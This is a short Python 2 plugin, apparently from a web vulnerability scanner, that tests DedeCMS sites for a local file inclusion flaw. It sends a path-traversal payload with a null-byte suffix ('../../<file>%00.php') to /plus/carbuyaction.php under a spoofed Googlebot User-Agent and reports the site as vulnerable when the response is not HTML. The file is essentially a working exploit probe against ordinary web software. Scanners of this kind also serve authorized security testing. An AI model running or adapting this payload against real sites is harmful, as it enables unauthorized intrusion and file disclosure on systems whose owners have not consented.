#/usr/bin/python2.7
#coding=gb2312
#http://www.mdbhack.com
#http://sebug.net/vuldb/ssvid-60716

import httplib
import re



#############################dedecms包含漏洞############################
class dedecmsbaohan:
    support = 'dedecms'
    
    def isSupport(self,servie):
        if servie in self.support:
            return True
        else:
            return False
        
    def scan(self,arg,servie):
        if not self.isSupport(servie):
            return None
        url = arg.split('//')[1]
        if not self.getcss(arg):
            css = 'index.html'+'%00.php'
        else:
            css = self.getcss(arg)+'%00.php'
        site = '''/plus/carbuyaction.php?dopost=return&code=../../%s''' % css
        headers = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                   "cookie":"code=alipay"}
        conn = httplib.HTTPConnection(url)
        try:
            conn.request('GET',site,None,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            if (httpres.status == 200) and (len(html)>0) and html[:6]!='<html>':
                print 'DeDecms Local Inclusion Vulnerability'
        except:
            pass        
    def getcss(self,arg):
        url = arg.split('//')[1]
        headers = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
        conn = httplib.HTTPConnection(url)
        try:
            conn.request('GET','/',None,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            mm = r'''href="(.*?).css"'''
            gg = re.findall(mm,html)
            if gg[0].startswith('http'):
                return gg[0].split('/',3)[3]+'.css'
            else:
                return gg[0]+'.css'
        except:
            pass
